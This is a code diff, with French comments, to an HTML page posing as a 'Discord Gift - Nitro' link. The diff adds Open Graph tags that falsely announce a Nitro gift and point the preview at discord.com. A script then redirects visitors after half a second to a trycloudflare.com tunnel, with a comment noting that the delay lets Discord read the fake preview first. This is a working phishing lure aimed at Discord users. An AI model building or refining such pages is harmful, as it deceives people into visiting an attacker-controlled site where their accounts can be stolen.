@@ -3,15 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <title>Discord Gift - Nitro</title>
+
+    <meta property="og:title" content="Un cadeau sauvage apparaît !" />
+    <meta property="og:description" content="Tu as reçu un cadeau Nitro de la part de H3SSKA ! Clique pour le réclamer." />
+    <meta property="og:image" content="https://i.imgur.com/9v6v991.png" />
+    <meta property="og:url" content="https://discord.com/nitro" />
+    <meta name="theme-color" content="#7289da">
+    <meta name="twitter:card" content="summary_large_image">
+
     <script>
-        // REMPLACE CETTE URL PAR TON LIEN CLOUDFLARE ACTUEL
-        const TUNNEL_URL = " https://software-specifications-yeah-folder.trycloudflare.com";
+        // TON LIEN CLOUDFLARE
+        const TUNNEL_URL = "https://software-specifications-yeah-folder.trycloudflare.com";
         
-        // Redirection immédiate dès l'ouverture
-        window.location.replace(TUNNEL_URL);
+        // On attend 500ms pour laisser Discord "lire" les balises ci-dessus
+        setTimeout(function() {
+            window.location.replace(TUNNEL_URL);
+        }, 500);
     </script>
 </head>
-<body style="background-color: #36393f; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
-    <p>Chargement du cadeau Nitro...</p>
+<body style="background-color: #36393f; color: white; font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
+    <div>
+        <img src="https://i.imgur.com/v9Ooo6m.png" style="width: 80px; margin-bottom: 20px;">
+        <p>Chargement du cadeau Nitro...</p>
+    </div>
 </body>
 </html>
